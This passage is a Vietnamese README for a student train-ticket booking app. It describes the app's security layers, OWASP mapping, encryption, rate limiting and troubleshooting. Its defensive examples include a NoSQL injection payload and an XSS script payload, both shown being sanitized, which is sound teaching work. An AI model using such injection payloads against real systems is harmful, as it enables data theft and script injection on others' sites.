Mỗi chuyến tàu có 1 room: `train_<trainId>`. Client join khi mở sơ đồ ghế, leave khi thoát.

---

## 🌱 Dữ liệu mẫu (Seed)

Chạy `cd server && npm run seed` để tạo dữ liệu:

### Ga tàu (9 ga)

| Code | Tên ga | Thành phố |
|------|--------|----------|
| HN | Hà Nội | Hà Nội |
| VINH | Vinh | Nghệ An |
| DH | Đồng Hới | Quảng Bình |
| HUE | Huế | Thừa Thiên Huế |
| DAD | Đà Nẵng | Đà Nẵng |
| QNG | Quảng Ngãi | Quảng Ngãi |
| NTR | Nha Trang | Khánh Hoà |
| HCM | TP Hồ Chí Minh | TPHCM |
| BH | Biên Hoà | Đồng Nai |

### Chuyến tàu (4 chuyến)

| Mã tàu | Loại | Ga đi → Ga đến | Giờ | Trạng thái |
|---------|------|----------------|-----|-----------|
| SE1 | Tàu nhanh | HN → DAD | 06:00–20:30 | ✅ Published |
| SE3 | Tàu nhanh | HN → DAD | 19:30–10:00 | ✅ Published |
| SE5 | Tàu chất lượng cao | HN → DAD | 07:00–20:15 | 📝 Draft |
| SE7 | Tàu thường | HN → DAD | 22:00–13:30 | ❌ Cancelled |

### Toa tàu (3 loại × 4 chuyến = 12 toa)

| Mã toa | Loại | Số ghế | Giá cơ bản |
|--------|------|--------|-----------|
| NM1 | Ngồi mềm điều hoà | 16 | 520.000₫ |
| K6 | Nằm khoang 6 | 12 | 680.000₫ |
| K4 | Nằm khoang 4 | 8 | 820.000₫ |

### Mã giảm giá

| Code | Loại | Giá trị | Điều kiện | Giảm tối đa |
|------|------|---------|----------|-------------|
| SAVE20 | Phần trăm | 20% | Đơn ≥ 500.000₫ | 200.000₫ |

---

## ⚡ Scripts nhanh

### Frontend

```bash
npm run dev       # Chạy dev server (Vite, hot reload)
npm run build     # Build production → thư mục dist/
npm run preview   # Preview bản build production
npm run lint      # Kiểm tra code style (ESLint)
```

### Backend

```bash
cd server
npm run dev       # Chạy backend server (node src/server.js)
npm run seed      # Seed dữ liệu mẫu
```

### Capacitor (Android)

```bash
npm run build              # Build frontend
npx cap sync android       # Sync dist/ vào Android project
npx cap open android       # Mở Android Studio
npx cap run android        # Build & run trên thiết bị/emulator
```

### Tiện ích

```bash
# Tạo báo cáo thanh toán (Word .docx)
node scripts/generate-payment-report.mjs
```

---

## 🔐 Báo cáo An ninh Thông tin

> **Dự án môn học An ninh Thông tin** — Tài liệu chi tiết về kiến trúc bảo mật, các phương pháp áp dụng, cách hoạt động, và ánh xạ với chuẩn OWASP Top 10:2021.

### Mục tiêu bảo mật

- Xây dựng ứng dụng đặt vé tàu có **phân quyền rõ ràng** (admin / khách hàng)
- **Bảo mật toàn diện dữ liệu người dùng** — mã hoá tất cả PII (Personally Identifiable Information)
- **Giảm bề mặt tấn công** (Attack Surface) bằng nhiều lớp bảo vệ
- **Tuân thủ nguyên tắc** Defense-in-Depth, Least Privilege, Fail-Fast
- **Phát hiện và truy vết** hành vi bất thường qua audit logging
- **Ánh xạ biện pháp** với chuẩn quốc tế OWASP Top 10:2021

### Kiến thức An ninh Thông tin áp dụng

#### Tam giác CIA (CIA Triad)

```
                    ┌───────────────────┐
                    │  CONFIDENTIALITY  │
                    │   (Bảo mật)       │
                    │                   │
                    │ • AES-256-GCM     │
                    │ • Bcrypt hash     │
                    │ • Data masking    │
                    │ • Response filter │
                    └────────┬──────────┘
                             │
              ┌──────────────┼──────────────┐
              │              │              │
    ┌─────────▼─────────┐    │    ┌─────────▼─────────┐
    │    INTEGRITY       │    │    │   AVAILABILITY    │
    │   (Toàn vẹn)       │    │    │   (Sẵn sàng)      │
    │                    │    │    │                    │
    │ • GCM auth tag     │    │    │ • Rate limiting    │
    │ • JWT signature    │    │    │ • Account lockout  │
    │ • Bcrypt verify    │    │    │   (tạm thời)       │
    │ • Input validation │    │    │ • Auto hold cleanup│
    │ • HMAC payment     │    │    │ • Error handling   │
    └────────────────────┘    │    └────────────────────┘
                              │
                     CIA TRIAD
```

| Nguyên tắc | Ý nghĩa | Áp dụng trong dự án |
|-----------|---------|--------------------|
| **Confidentiality** | Chỉ người được uỷ quyền mới đọc được dữ liệu | AES-256-GCM cho PII, bcrypt cho password, data masking, response sanitization |
| **Integrity** | Dữ liệu không bị sửa đổi trái phép | GCM authentication tag, JWT signature, HMAC trong payment webhook |
| **Availability** | Hệ thống luôn sẵn sàng phục vụ | Rate limiting, account lockout tạm thời (không vĩnh viễn), auto hold cleanup |

#### Nguyên tắc Defense-in-Depth (Phòng thủ theo chiều sâu)

Không dựa vào **một lớp bảo mật duy nhất**, mà áp dụng **nhiều lớp bảo vệ chồng lên nhau**. Nếu một lớp bị vượt qua, các lớp còn lại vẫn bảo vệ hệ thống.

#### Nguyên tắc Least Privilege (Quyền tối thiểu)

- API response chỉ trả dữ liệu masked — không trả encrypted data
- Admin routes yêu cầu `requireRole('admin')`
- User chỉ xem được đơn hàng/vé của chính mình (`userId: req.user.id`)

#### Nguyên tắc Fail-Fast (Dừng sớm khi lỗi)

- `DATA_ENCRYPTION_KEY` sai format → server **dừng ngay** (không chạy với key yếu)
- Input validation ở middleware → reject request trước khi đến controller
- Account lockout → chặn brute force trước khi thử quá nhiều

---

### Kiến trúc bảo mật 7 lớp (Defense-in-Depth)

```
┌──────────────────────────────────────────────────────────────────────┐
│                        CLIENT (React App)                            │
│                                                                      │
│  Lớp 1: CLIENT-SIDE SECURITY                                        │
│  ┌────────────────┐  ┌──────────────────┐  ┌──────────────────────┐  │
│  │ JWT Token Mgmt │  │ Auto Logout 401  │  │ Error Sanitization   │  │
│  │ (Capacitor     │  │ (token expired → │  │ (không hiện stack    │  │
│  │  Preferences)  │  │  clear + reload) │  │  trace cho user)     │  │
│  └────────────────┘  └──────────────────┘  └──────────────────────┘  │
└──────────────────────────────┬───────────────────────────────────────┘
                               │ HTTPS
┌──────────────────────────────▼───────────────────────────────────────┐
│  Lớp 2: HTTP SECURITY HEADERS (Helmet)                               │
│  X-Content-Type-Options: nosniff │ X-Frame-Options: DENY             │
│  Strict-Transport-Security       │ Content-Security-Policy            │
│  X-Download-Options: noopen      │ X-Permitted-Cross-Domain-Policies  │
├──────────────────────────────────────────────────────────────────────┤
│  Lớp 3: REQUEST FILTERING                                           │
│  ┌───────────┐ ┌───────────┐ ┌──────────────┐ ┌──────────────────┐  │
│  │ Body Limit│ │   CORS    │ │Input Sanitize│ │  Rate Limiting   │  │
│  │  (10 KB)  │ │(whitelist)│ │(NoSQL + XSS) │ │ (300/30/60 req)  │  │
│  └───────────┘ └───────────┘ └──────────────┘ └──────────────────┘  │
├──────────────────────────────────────────────────────────────────────┤
│  Lớp 4: INPUT VALIDATION                                            │
│  ┌─────────────────┐ ┌──────────────────┐ ┌──────────────────────┐  │
│  │ Email format    │ │ Password strength│ │ PII format           │  │
│  │ (RFC 5322)      │ │ (8+ chars, mixed)│ │ (phone 10-11, CCCD)  │  │
│  └─────────────────┘ └──────────────────┘ └──────────────────────┘  │
├──────────────────────────────────────────────────────────────────────┤
│  Lớp 5: AUTHENTICATION & AUTHORIZATION                              │
│  ┌────────────────┐ ┌──────────────────┐ ┌──────────────────────┐   │
│  │ JWT Verify     │ │ Role-Based       │ │ Account Lockout      │   │
│  │ (24h expiry)   │ │ Access Control   │ │ (5 fails → 15min)    │   │
│  └────────────────┘ └──────────────────┘ └──────────────────────┘   │
├──────────────────────────────────────────────────────────────────────┤
│  Lớp 6: DATA PROTECTION (at rest)                                    │
│  ┌────────────────┐ ┌──────────────────┐ ┌──────────────────────┐   │
│  │ AES-256-GCM    │ │ Bcrypt (salt=10) │ │ Data Masking         │   │
│  │ (ALL PII)      │ │ (password + OTP) │ │ (phone,CCCD,name,    │   │
│  │ phone, CCCD,   │ │                  │ │  email)              │   │
│  │ name, email    │ │                  │ │                      │   │
│  └────────────────┘ └──────────────────┘ └──────────────────────┘   │
├──────────────────────────────────────────────────────────────────────┤
│  Lớp 7: MONITORING & AUDIT                                          │
│  ┌────────────────┐ ┌──────────────────┐ ┌──────────────────────┐   │
│  │ Security Audit │ │ Error Masking    │ │ TTL Auto-cleanup     │   │
│  │ Log (MongoDB)  │ │ (prod vs dev)    │ │ (90 ngày)            │   │
│  └────────────────┘ └──────────────────┘ └──────────────────────┘   │
└──────────────────────────────────────────────────────────────────────┘
```

---

### Ánh xạ OWASP Top 10:2021

| # | OWASP Category | Biện pháp trong dự án | File |
|---|---------------|----------------------|------|
| A01 | **Broken Access Control** | RBAC (`requireRole`), response sanitization, ownership check (`userId: req.user.id`) | `auth.middleware.js`, `order.controller.js` |
| A02 | **Cryptographic Failures** | AES-256-GCM cho PII, bcrypt cho password, CSPRNG cho mã vé | `crypto.service.js`, `generateCode.js` |
| A03 | **Injection** | Input sanitizer (NoSQL), HTML escape (XSS), input validation | `inputSanitizer.middleware.js`, `inputValidator.middleware.js` |
| A04 | **Insecure Design** | Fail-fast key validation, Defense-in-Depth middleware stack | `crypto.service.js`, `app.js` |
| A05 | **Security Misconfiguration** | Helmet headers, CORS whitelist, body size limit, error masking | `app.js`, `error.middleware.js` |
| A06 | **Vulnerable Components** | Sử dụng phiên bản mới nhất (Express 5, Mongoose 9, Helmet 8) | `package.json` |
| A07 | **Auth Failures** | Password strength, account lockout, JWT 24h expiry, OTP hash | `auth.controller.js`, `inputValidator.middleware.js` |
| A08 | **Software Integrity** | HMAC signature verify cho MoMo/ZaloPay webhook | `momo.service.js`, `zalopay.service.js` |
| A09 | **Logging Failures** | Audit log cho login/order/payment/ticket cancel, TTL 90 ngày | `audit.middleware.js`, `auditLog.model.js` |
| A10 | **SSRF** | Không có user-controlled URL fetch | N/A |

---

### Chi tiết các biện pháp bảo mật (16 biện pháp)

#### 1. 🛡 Input Sanitizer — Chống NoSQL Injection & XSS

| Mục | Nội dung |
|-----|---------|
| **Vị trí** | `server/src/middlewares/inputSanitizer.middleware.js` |
| **Phương pháp** | Tự viết middleware thuần (không dùng thư viện ngoài) |
| **Chống NoSQL Injection** | Duyệt đệ quy `req.body/query/params`, loại bỏ mọi key bắt đầu bằng `$` (MongoDB operators: `$gt`, `$regex`, `$where`...) |
| **Chống XSS** | Escape 5 ký tự HTML đặc biệt: `<` → `&lt;`, `>` → `&gt;`, `&` → `&amp;`, `"` → `&quot;`, `'` → `&#x27;` |
| **OWASP** | A03:2021 – Injection |

**Cách hoạt động:**
```
Request body: { "email": {"$gt": ""}, "name": "<script>alert('xss')</script>" }
                                ↓ InputSanitizer
Sanitized:    { "email": {},     "name": "&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;" }
```

#### 2. ✅ Input Validator — Kiểm tra format dữ liệu

| Mục | Nội dung |
|-----|---------|
| **Vị trí** | `server/src/middlewares/inputValidator.middleware.js` |
| **Phương pháp** | Regex-based validation (tự viết, không dùng express-validator) |
| **Validators** | `validateRegister` (email + password + name), `validateLogin` (email + password), `validatePassengers` (phone + CCCD) |
| **OWASP** | A03:2021 – Injection, A04:2021 – Insecure Design |

**Validation Rules:**

| Trường | Regex / Rule | Ví dụ hợp lệ |
|--------|-------------|---------------|
| Email | `/^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/` | `user@example.com` |
| Password | `/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&.#]).{8,}$/` | `MyP@ss123` |
| Phone | `/^(\+84|0)\d{9,10}$/` | `0901234567` |
| CCCD | `/^\d{9}$|^\d{12}$/` | `012345678901` |
| Tên | 2–50 ký tự | `Nguyễn Văn An` |

#### 3. 🔐 Password Strength Enforcement

| Mục | Nội dung |
|-----|---------|
| **Vị trí** | `server/src/controllers/auth.controller.js` + `inputValidator.middleware.js` |
| **Yêu cầu** | ≥ 8 ký tự, ít nhất 1 chữ hoa + 1 chữ thường + 1 chữ số + 1 ký tự đặc biệt |
| **Tham chiếu** | NIST SP 800-63B (Digital Identity Guidelines) |
| **OWASP** | A07:2021 – Identification and Authentication Failures |

**Ví dụ:**
```
❌ "123456"        → Quá ngắn, thiếu chữ hoa, thường, ký tự đặc biệt
❌ "password"      → Thiếu chữ hoa, số, ký tự đặc biệt
❌ "Password1"     → Thiếu ký tự đặc biệt
✅ "MyP@ssw0rd!"   → Đủ tất cả yêu cầu
```

#### 4. 🔒 Account Lockout (Khoá tài khoản tạm thời)

| Mục | Nội dung |
|-----|---------|
| **Vị trí** | `server/src/controllers/auth.controller.js` |
| **Cơ chế** | Sau **5 lần login sai** liên tiếp → khoá tài khoản **15 phút** |
| **Lưu trữ** | `User.failedLoginAttempts` (Number) + `User.lockUntil` (Date) |
| **Reset** | Counter reset về 0 khi login thành công |
| **OWASP** | A07:2021 – Identification and Authentication Failures |

**Luồng hoạt động:**
```
Login thử 1 → Sai password → failedLoginAttempts = 1
Login thử 2 → Sai password → failedLoginAttempts = 2
Login thử 3 → Sai password → failedLoginAttempts = 3
Login thử 4 → Sai password → failedLoginAttempts = 4
Login thử 5 → Sai password → failedLoginAttempts = 5
                            → lockUntil = now + 15 phút
                            → HTTP 423 Locked
                            → Audit log: AUTH_ACCOUNT_LOCKED

... 15 phút sau ...

Login thử 6 → Đúng password → failedLoginAttempts = 0, lockUntil = null
                              → HTTP 200 OK + JWT token
```

#### 5. ⏰ JWT Token Expiry 24 giờ

| Mục | Nội dung |
|-----|---------|
| **Vị trí** | `server/src/controllers/auth.controller.js` |
| **Trước** | `expiresIn: '7d'` (7 ngày) |
| **Sau** | `expiresIn: '24h'` (24 giờ) |
| **Lý do** | Giảm thời gian kẻ tấn công sử dụng token bị đánh cắp |
| **Client** | Auto-logout khi nhận HTTP 401 → xoá token + reload |
| **OWASP** | A07:2021 – Identification and Authentication Failures |

#### 6. 🔑 Fail-fast khoá mã hoá

| Mục | Nội dung |
|-----|---------|
| **Vị trí** | `server/src/services/crypto.service.js` |
| **Hoạt động** | Kiểm tra `DATA_ENCRYPTION_KEY` phải đúng 64 ký tự hex. Sai → `throw Error` → server dừng ngay |
| **Tác dụng** | Loại bỏ nguy cơ chạy với key fallback yếu |
| **OWASP** | A02:2021 – Cryptographic Failures |

#### 7. 🔒 Mã hoá AES-256-GCM toàn diện cho dữ liệu PII

| Mục | Nội dung |
|-----|---------|
| **Vị trí** | `server/src/services/crypto.service.js` |
| **Thuật toán** | AES-256-GCM (Authenticated Encryption with Associated Data) |
| **Tại sao GCM?** | Vừa mã hoá (confidentiality) vừa xác thực (integrity) — nếu ciphertext bị sửa, decryption sẽ thất bại |
| **IV** | 12 bytes random mỗi lần encrypt (đảm bảo cùng plaintext → khác ciphertext) |
| **OWASP** | A02:2021 – Cryptographic Failures |

**Dữ liệu được mã hoá (nâng cấp):**

| Trường | Trước | Sau |
|--------|:-----:|:---:|
| Số điện thoại (`phone`) | ✅ Đã mã hoá | ✅ Giữ nguyên |
| CCCD/CMND (`nationalId`) | ✅ Đã mã hoá | ✅ Giữ nguyên |
| **Họ tên (`fullName`)** | ❌ Plaintext | ✅ **Mã hoá** |
| **Email (`email`)** | ❌ Plaintext | ✅ **Mã hoá** |

**Cấu trúc lưu trữ mỗi trường:**
```json
{
  "phoneEncrypted": {
    "iv": "a1b2c3d4e5f6a7b8c9d0e1f2",
    "content": "8f9e7d6c5b4a3210...",
    "tag": "1a2b3c4d5e6f7890..."
  },
  "phoneMasked": "0901****67",
  "fullNameEncrypted": { "iv": "...", "content": "...", "tag": "..." },
  "fullName": "Nguyễn V. A.",
  "emailEncrypted": { "iv": "...", "content": "...", "tag": "..." },
  "emailMasked": "u***@example.com"
}
```

#### 8. 🎭 Data Masking (4 loại)

| Hàm | Input | Output | Mục đích |
|-----|-------|--------|----------|
| `maskPhone()` | `0901234567` | `0901****67` | Hiển thị SĐT |
| `maskNationalId()` | `012345678901` | `********8901` | Hiển thị CCCD |
| `maskFullName()` | `Nguyễn Văn An` | `Nguyễn V. A.` | Hiển thị tên |
| `maskEmail()` | `user@example.com` | `u***@example.com` | Hiển thị email |

#### 9. 🧹 Response Sanitization (nâng cấp)

| Mục | Nội dung |
|-----|---------|
| **Vị trí** | `server/src/controllers/order.controller.js` → `sanitizeOrderForCustomer()` |
| **Hoạt động** | Loại bỏ tất cả trường `*Encrypted` khỏi API response |
| **Trường bị loại bỏ** | `phoneEncrypted`, `nationalIdEncrypted`, `fullNameEncrypted`, `emailEncrypted` |
| **Trường được trả** | `phoneMasked`, `nationalIdMasked`, `fullName` (masked), `emailMasked` |
| **OWASP** | A01:2021 – Broken Access Control |

#### 10. 📝 Security Audit Logging

| Mục | Nội dung |
|-----|---------|
| **Model** | `server/src/models/auditLog.model.js` |
| **Middleware** | `server/src/middlewares/audit.middleware.js` |
| **Thiết kế** | Fire-and-forget (không block request, không crash nếu lỗi) |
| **TTL** | Tự động xoá sau 90 ngày (MongoDB TTL index) |
| **OWASP** | A09:2021 – Security Logging and Monitoring Failures |

**Các sự kiện được ghi log:**

| Event | Trigger | Dữ liệu ghi |
|-------|---------|-------------|
| `AUTH_LOGIN_SUCCESS` | Login thành công | userId, IP, User-Agent, role |
| `AUTH_LOGIN_FAILED` | Login sai password/email | IP, User-Agent, email, attempt count |
| `AUTH_ACCOUNT_LOCKED` | Account bị khoá | userId, IP, lock duration |
| `AUTH_REGISTER` | Gửi OTP đăng ký | IP, email |
| `ORDER_CREATED` | Tạo đơn hàng | userId, orderId, orderCode, total |
| `TICKET_CANCELLED` | Huỷ vé | userId, ticketId, ticketCode |
| `ADMIN_ACCESS` | Truy cập route admin | userId, IP, method, URL |

#### 11. 🎲 Cryptographically Secure Code Generation

| Mục | Nội dung |
|-----|---------|
| **Vị trí** | `server/src/utils/generateCode.js` |
| **Trước** | `Math.random()` — PRNG, thuật toán xorshift128+, có thể dự đoán |
| **Sau** | `crypto.randomInt()` — CSPRNG, entropy từ OS (/dev/urandom hoặc CryptGenRandom) |
| **Tác dụng** | Mã vé (TK...) và mã đơn hàng (OD...) không thể dự đoán → chống enumeration attack |
| **OWASP** | A02:2021 – Cryptographic Failures |

#### 12. 📦 Request Body Size Limit

| Mục | Nội dung |
|-----|---------|
| **Vị trí** | `server/src/app.js` → `express.json({ limit: '10kb' })` |
| **Hoạt động** | Request body > 10KB → HTTP 413 Payload Too Large |
| **Tác dụng** | Chống DoS bằng payload quá lớn |
| **OWASP** | A05:2021 – Security Misconfiguration |

#### 13. ⏱ Rate Limiting phân tầng

| Scope | Giới hạn | Mục đích |
|-------|---------|---------|
| Toàn app | 300 req / 15 phút | Chống DDoS cơ bản |
| `/api/auth` | 30 req / 15 phút | Chống brute force OTP / login |
| `/api/payments` | 60 req / 15 phút | Chống spam thanh toán |

#### 14. 🛡 HTTP Security Headers (Helmet)

| Header | Giá trị | Tác dụng |
|--------|---------|----------|
| `X-Content-Type-Options` | `nosniff` | Chống MIME sniffing |
| `X-Frame-Options` | `DENY` | Chống Clickjacking |
| `Strict-Transport-Security` | `max-age=15552000` | Bắt buộc HTTPS |
| `Content-Security-Policy` | default-src 'self' | Chống XSS, data injection |
| `X-Download-Options` | `noopen` | Chống drive-by download |
| `Referrer-Policy` | `no-referrer` | Không leak URL referer |

#### 15. 🎭 Error Masking ở Production

| Môi trường | Hành vi |
|-----------|--------|
| `development` | Trả `err.message` đầy đủ để debug |
| `production` | Trả message chung: *"Đã xảy ra lỗi. Vui lòng thử lại sau."* |

#### 16. 🔄 Client-side Auto Logout

| Mục | Nội dung |
|-----|---------|
| **Vị trí** | `src/api/http.js` — Axios response interceptor |
| **Hoạt động** | Khi nhận HTTP 401 → tự động xoá token khỏi Capacitor Preferences → reload app |
| **Tác dụng** | Chống sử dụng token đã hết hạn (Session Fixation prevention) |

---

### Luồng dữ liệu nhạy cảm (nâng cấp)

```
┌──────────────────────────────────────────────────────────────────┐
│ Người dùng nhập: Họ tên, SĐT, CCCD, Email                      │
└──────────────────────┬──────────────────────────────────────────┘
                       │
                       ▼
┌──────────────────────────────────────────────────────────────────┐
│ Lớp 3: Input Sanitizer                                          │
│ • Loại bỏ MongoDB operators ($gt, $regex...)                    │
│ • Escape HTML entities (<, >, &, ", ')                          │
└──────────────────────┬──────────────────────────────────────────┘
                       │
                       ▼
┌──────────────────────────────────────────────────────────────────┐
│ Lớp 4: Input Validator                                          │
│ • Kiểm tra format: email, phone (10-11 số), CCCD (9/12 số)     │
│ • Kiểm tra name: 2-50 ký tự                                    │
│ • Reject ngay nếu không hợp lệ → HTTP 400                      │
└──────────────────────┬──────────────────────────────────────────┘
                       │
                       ▼
┌──────────────────────────────────────────────────────────────────┐
│ Lớp 6: Data Protection                                          │
│                                                                  │
│ encryptText(fullName)     → { iv, content, tag }                │
│ encryptText(phone)        → { iv, content, tag }                │
│ encryptText(cccd)         → { iv, content, tag }                │
│ encryptText(email)        → { iv, content, tag }                │
│                                                                  │
│ maskFullName("Nguyễn Văn An")  → "Nguyễn V. A."                 │
│ maskPhone("0901234567")        → "0901****67"                   │
│ maskNationalId("012345678901") → "********8901"                 │
│ maskEmail("user@example.com")  → "u***@example.com"             │
└──────────────────────┬──────────────────────────────────────────┘
                       │
                       ▼
┌──────────────────────────────────────────────────────────────────┐
│ MongoDB Storage                                                  │
│                                                                  │
│ Order.passengers[]: {                                            │
│   fullName: "Nguyễn V. A.",           ← masked (hiển thị)      │
│   fullNameEncrypted: { iv, content, tag },  ← AES-256-GCM      │
│   phoneMasked: "0901****67",          ← masked (hiển thị)      │
│   phoneEncrypted: { iv, content, tag },     ← AES-256-GCM      │
│   nationalIdMasked: "********8901",   ← masked (hiển thị)      │
│   nationalIdEncrypted: { iv, content, tag }, ← AES-256-GCM     │
│   emailMasked: "u***@example.com",    ← masked (hiển thị)      │
│   emailEncrypted: { iv, content, tag }       ← AES-256-GCM     │
│ }                                                                │
└──────────────────────┬──────────────────────────────────────────┘
                       │
                       ▼
┌──────────────────────────────────────────────────────────────────┐
│ API Response (GET /orders/my) — Response Sanitization            │
│                                                                  │
│ sanitizeOrderForCustomer() chỉ trả:                             │
│ {                                                                │
│   fullName: "Nguyễn V. A.",                                     │
│   phoneMasked: "0901****67",                                    │
│   nationalIdMasked: "********8901",                             │
│   emailMasked: "u***@example.com"                               │
│ }                                                                │
│                                                                  │
│ ❌ KHÔNG trả: *Encrypted fields (bị loại bỏ hoàn toàn)         │
└──────────────────────────────────────────────────────────────────┘
```

---

### Ma trận rủi ro và biện pháp (mở rộng)

| # | Kịch bản tấn công | Mức rủi ro | Biện pháp | Trạng thái |
|---|-------------------|:----------:|-----------|:----------:|
| 1 | Truy cập admin từ tài khoản khách | 🔴 Cao | `requireRole('admin')` middleware | ✅ |
| 2 | Giả mạo / sửa JWT token | 🔴 Cao | JWT verify + 24h expiry + auto logout | ✅ |
| 3 | Brute force login | 🔴 Cao | Account lockout (5 lần → 15 phút) + rate limit | ✅ |
| 4 | Brute force OTP | 🟡 TB | Max 5 attempts + rate limit 30 req/15 min | ✅ |
| 5 | NoSQL Injection (`{"$gt":""}`) | 🔴 Cao | Input sanitizer loại bỏ `$` operators | ✅ |
| 6 | Stored XSS (`<script>...`) | 🔴 Cao | HTML entity escape trong sanitizer | ✅ |
| 7 | Rò rỉ PII qua API response | 🔴 Cao | Response sanitization + ALL fields encrypted | ✅ |
| 8 | Rò rỉ PII từ database breach | 🔴 Cao | AES-256-GCM cho tất cả PII (name, phone, CCCD, email) | ✅ |
| 9 | Mật khẩu yếu | 🟡 TB | Password strength enforcement (8+ chars, mixed) | ✅ |
| 10 | Dự đoán mã vé / đơn hàng | 🟡 TB | CSPRNG (`crypto.randomInt`) thay `Math.random()` | ✅ |
| 11 | Key mã hoá yếu / thiếu | 🔴 Cao | Fail-fast kiểm tra 64 hex chars | ✅ |
| 12 | Spam thanh toán | 🟡 TB | Rate limit 60 req/15 phút | ✅ |
| 13 | Payload quá lớn (DoS) | 🟡 TB | Body size limit 10KB | ✅ |
| 14 | Lộ thông tin lỗi hệ thống | 🟡 TB | Error masking ở production | ✅ |
| 15 | CSRF / Cross-origin | 🟡 TB | CORS whitelist + Helmet headers | ✅ |
| 16 | Sử dụng token hết hạn | 🟡 TB | Client auto logout on 401 | ✅ |
| 17 | Không truy vết được hành vi đáng ngờ | 🟡 TB | Audit log (7 loại event, TTL 90 ngày) | ✅ |
| 18 | Luồng legacy bị khai thác | 🟡 TB | HTTP 410 Gone ở production | ✅ |

---

### So sánh trước và sau nâng cấp

| Tiêu chí | Trước nâng cấp | Sau nâng cấp |
|----------|:--------------:|:------------:|
| **PII được mã hoá** | 2/4 trường (phone, CCCD) | **4/4 trường** (phone, CCCD, name, email) |
| **Input validation** | ❌ Không có | ✅ Middleware validate email, password, phone, CCCD |
| **NoSQL Injection protection** | ❌ Không có | ✅ Sanitizer loại bỏ `$` operators |
| **XSS protection** | ❌ Không có | ✅ HTML entity escape |
| **Password strength** | ❌ Không yêu cầu | ✅ 8+ chars, mixed (hoa + thường + số + đặc biệt) |
| **Account lockout** | ❌ Không có | ✅ 5 lần sai → khoá 15 phút |
| **JWT expiry** | 7 ngày | **24 giờ** |
| **Auto logout (client)** | ❌ Không có | ✅ Tự động logout khi 401 |
| **Audit logging** | ❌ Không có | ✅ 7 loại event, TTL 90 ngày |
| **Code generation** | `Math.random()` (PRNG) | `crypto.randomInt()` (**CSPRNG**) |
| **Body size limit** | ❌ Không giới hạn | ✅ 10KB max |
| **OWASP coverage** | 4/10 categories | **9/10 categories** |
| **Số biện pháp bảo mật** | 9 | **16** |

---

### Kiểm thử bảo mật đã thực hiện

- [x] Đăng ký / đăng nhập với 2 vai trò (admin, customer)
- [x] Đăng ký với mật khẩu yếu → HTTP 400 (bị reject)
- [x] Login sai 5 lần → HTTP 423 (account locked 15 phút)
- [x] Truy cập route admin bằng tài khoản thường → HTTP 403
- [x] NoSQL injection payload `{"email": {"$gt": ""}}` → bị sanitize
- [x] XSS payload `<script>alert('xss')</script>` → bị escape
- [x] Server dừng khi `DATA_ENCRYPTION_KEY` sai định dạng
- [x] API đơn hàng không trả dữ liệu `*Encrypted`
- [x] Mã vé/đơn hàng dùng CSPRNG (không dự đoán được)
- [x] Audit log ghi nhận login/order/ticket cancel
- [x] Rate limit chặn request vượt ngưỡng
- [x] Error response ở production không chứa stack trace
- [x] CORS reject origin không nằm trong whitelist
- [x] JWT 24h → client auto logout khi hết hạn
- [x] Request body > 10KB → HTTP 413

### Hạn chế và hướng phát triển

| # | Hạn chế hiện tại | Hướng giải quyết |
|---|------------------|-----------------|
| 1 | Chưa có cơ chế cấp role admin an toàn | Thêm invite code hoặc seed admin từ CLI |
| 2 | Chưa enforce HTTPS ở tầng app | Cấu hình reverse proxy (Nginx/Caddy) với SSL certificate |
| 3 | Chưa có 2FA cho admin | Thêm TOTP (Google Authenticator) cho tài khoản admin |
| 4 | JWT không có refresh token | Thêm refresh token rotation để tăng bảo mật |
| 5 | Chưa có CAPTCHA | Thêm reCAPTCHA/hCaptcha cho form đăng ký / login |
| 6 | Chưa mã hoá database connection | Bật TLS cho MongoDB connection string |

---

## 🔧 Xử lý sự cố

### Lỗi thường gặp

| Triệu chứng | Nguyên nhân | Cách xử lý |
|-------------|-------------|-----------|
| Server crash khi khởi động: *"DATA_ENCRYPTION_KEY must be exactly 64 hex characters"* | Key thiếu hoặc sai format | Tạo key mới: `openssl rand -hex 32` |
| *"Thieu MONGO_URI trong file .env"* | Chưa cấu hình MongoDB | Thêm `MONGO_URI=mongodb://127.0.0.1:27017/vetau_app` vào `server/.env` |
| CORS error trên browser | Origin không nằm trong whitelist | Thêm URL frontend vào `APP_ORIGIN` (phân cách bằng `,`) |
| Socket.IO không kết nối | CORS hoặc URL sai | Kiểm tra `APP_ORIGIN` chứa URL client, kiểm tra `VITE_API_WS` |
| Android app không gọi được API | API URL sai | Emulator: dùng `10.0.2.2`. Thiết bị thật: dùng IP máy tính LAN hoặc ngrok |
| OTP email không gửi | Chưa cấu hình SMTP | Thêm `SMTP_HOST`, `SMTP_USER`, `SMTP_PASS` vào `.env` |
| Ghế vẫn hiện "đang giữ" dù đã hết hạn | Hold Cleaner chưa chạy kịp | Chờ ≤ 30 giây, Hold Cleaner sẽ giải phóng tự động |
| *"Rate limit exceeded"* | Gửi quá nhiều request | Chờ 15 phút hoặc tăng `max` trong rate limiter config |

### Debug tips

```bash
# Kiểm tra server health
curl http://localhost:5000/api/health

# Kiểm tra MongoDB kết nối
mongosh --eval "db.adminCommand('ping')"

# Xem logs backend (đang chạy)
# Backend tự log mọi request ở development

# Test rate limit (gửi 31 request liên tiếp)
for ($i=1; $i -le 35; $i++) { Invoke-RestMethod http://localhost:5000/api/auth/login -Method POST -ContentType "application/json" -Body '{"email":"test","password":"test"}' }
```

---

## 🤝 Đóng góp & Phát triển

### Quy ước code

- **Frontend:** React 19 với React Compiler (tự động memo), ES modules
- **Backend:** CommonJS (`require`/`module.exports`), Express 5
- **Linting:** ESLint với `eslint-plugin-react-hooks` + `eslint-plugin-react-refresh`
- **Naming:**
  - Controllers: `<domain>.controller.js`
  - Models: `<domain>.model.js`
  - Routes: `<domain>.routes.js`
  - Services: `<domain>.service.js`
  - API (frontend): `<domain>.api.js`

### Thêm tính năng mới

1. **Model:** Thêm Mongoose schema trong `server/src/models/`
2. **Controller:** Thêm logic trong `server/src/controllers/`
3. **Route:** Đăng ký route trong `server/src/routes/` → mount trong `app.js`
4. **Service:** (Nếu cần) Tách business logic phức tạp vào `server/src/services/`
5. **Frontend API:** Thêm API client trong `src/api/`
6. **Frontend UI:** Cập nhật `src/App.jsx` hoặc tạo component mới trong `src/components/`

### Branching

```
main          ← Production-ready
├── develop   ← Tích hợp tính năng
│   ├── feature/xxx  ← Tính năng mới
│   └── fix/xxx      ← Sửa lỗi
```

---

## 📝 Giấy phép

